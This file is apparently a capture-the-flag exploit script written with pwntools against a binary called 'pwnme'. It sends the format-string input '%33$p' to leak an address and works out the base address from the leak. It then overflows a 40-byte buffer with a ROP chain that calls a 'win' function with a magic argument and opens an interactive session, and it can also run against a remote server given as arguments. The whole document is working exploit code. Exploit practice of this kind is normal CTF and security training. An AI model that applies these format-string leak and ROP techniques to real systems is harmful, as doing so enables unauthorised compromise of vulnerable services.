#!/usr/bin/env python3
from pwn import *


exe = './pwnme'

elf = context.binary = ELF('pwnme')
context.terminal = ['alacritty', '-e', 'zsh', '-c']

#context.log_level= 'DEBUG'



def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#### Exploit starts here ####

io = start()


OFFSET = 40

#payload = "%p-" * 35

io.sendline(b'%33$p')

leak = io.recv().strip().split(b'?',1)[1]
leak = int(leak,16)
success(f"got leak @ {hex(leak)}")
base_addr = leak - 0x10e0
success(f"got main addr @ {hex(base_addr)}")

elf.address = base_addr
rop = ROP(elf)

payload = b'A' * OFFSET
rop.raw(rop.ret)
rop.win(0xdeadbeefdeadbeef)
rop.win()
payload += rop.chain()

io.sendline(payload)

io.interactive()
